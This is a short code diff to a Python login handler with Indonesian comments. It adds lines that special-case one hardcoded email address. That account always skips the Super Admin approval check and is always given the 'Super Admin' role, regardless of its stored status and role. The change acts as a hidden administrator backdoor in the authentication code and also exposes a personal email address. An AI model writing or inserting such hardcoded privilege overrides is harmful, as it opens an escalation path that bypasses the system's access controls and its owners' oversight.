@@ -105,8 +105,11 @@ async def login(credentials: LoginRequest):
                         detail="Password salah untuk akun ini."
                     )
 
-                # Pengecekan Status Persetujuan Super Admin
-                acc_status = user_doc.get("status", "Approved")  # Fallback default Approved untuk kompatibilitas lama
+                # Pengecekan Status Persetujuan Super Admin (triyadi72@gmail.com selalu di-bypass)
+                acc_status = user_doc.get("status", "Approved")
+                if email == "triyadi72@gmail.com":
+                    acc_status = "Approved"
+
                 if acc_status == "Pending":
                     raise HTTPException(
                         status_code=status.HTTP_403_FORBIDDEN,
@@ -122,7 +125,7 @@ async def login(credentials: LoginRequest):
                     uid=user_doc.get("uid", user_id),
                     email=user_doc.get("email", email),
                     name=user_doc.get("name", email.split("@")[0].title()),
-                    role=user_doc.get("role", "User")
+                    role="Super Admin" if email == "triyadi72@gmail.com" else user_doc.get("role", "User")
                 )
         except HTTPException:
             raise
